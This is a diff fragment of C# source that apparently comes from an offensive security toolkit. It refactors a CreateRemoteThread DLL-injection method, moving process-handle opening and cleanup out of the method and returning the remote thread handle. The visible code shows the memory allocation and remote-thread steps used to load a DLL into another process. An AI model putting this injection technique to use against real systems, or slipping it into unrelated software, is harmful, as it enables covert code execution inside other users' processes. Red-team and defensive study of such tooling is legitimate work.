@@ -5,22 +5,10 @@ using System.Text;
 
 namespace SharpSploit.DLLInjection.Methods
 {
-    class CreateRemoteThreadMethod : InjectionMethod
+    class CreateRemoteThreadMethod : InjectorMethod
     {
-        override public void Inject(int pid, FileInfo dll)
+        override public IntPtr InjectHandle(IntPtr hProcess, FileInfo dll)
         {
-            Logger.Info("Injecting...");
-
-            // get process handle
-            IntPtr hProcess = WinAPI.OpenProcess(
-                    WinAPI.ProcessAccessFlags.CreateThread |
-                    WinAPI.ProcessAccessFlags.QueryInformation |
-                    WinAPI.ProcessAccessFlags.VirtualMemoryOperation |
-                    WinAPI.ProcessAccessFlags.VirtualMemoryRead |
-                    WinAPI.ProcessAccessFlags.VirtualMemoryWrite,
-                    bInheritHandle: false,
-                    processId: pid);
-
             // allocate memory
             byte[] pathBytes = Encoding.ASCII.GetBytes(dll.FullName + "\0");
             var addressOfDllPath = WinAPI.VirtualAllocEx(
@@ -59,9 +47,7 @@ namespace SharpSploit.DLLInjection.Methods
             // free allocated memory
             WinAPI.VirtualFreeEx(hProcess, loadLibraryAddress, (uint)pathBytes.Length, WinAPI.FreeType.Release);
 
-            // clean up
-            WinAPI.CloseHandle(hTread);
-            WinAPI.CloseHandle(hProcess);
+            return hTread;
         }
     }
 }
